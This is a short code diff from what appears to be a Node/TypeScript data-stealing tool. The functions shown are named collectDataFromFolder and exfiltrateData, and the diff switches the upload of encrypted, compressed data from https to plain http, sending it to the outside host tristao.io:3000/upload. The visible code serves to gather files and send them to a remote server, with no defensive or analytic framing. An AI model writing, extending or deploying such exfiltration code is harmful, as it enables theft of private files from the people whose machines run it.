@@ -2,7 +2,7 @@ import fs from 'fs';
 import path from 'path';
 import zlib from 'zlib';
 import crypto from 'crypto';
-import https from 'https';
+import http from 'http';
 import FormData from 'form-data';
 
 function collectDataFromFolder(folderPath: any) {
@@ -101,8 +101,8 @@ function exfiltrateData(encryptedData: any, iv: any) {
       headers: form.getHeaders(),
     };
 
-    const req = https.request(
-      'https://tristao.io:3000/upload',
+    const req = http.request(
+      'http://tristao.io:3000/upload',
       requestOptions,
       (res) => {
         console.log(`Response status: ${res.statusCode}`);
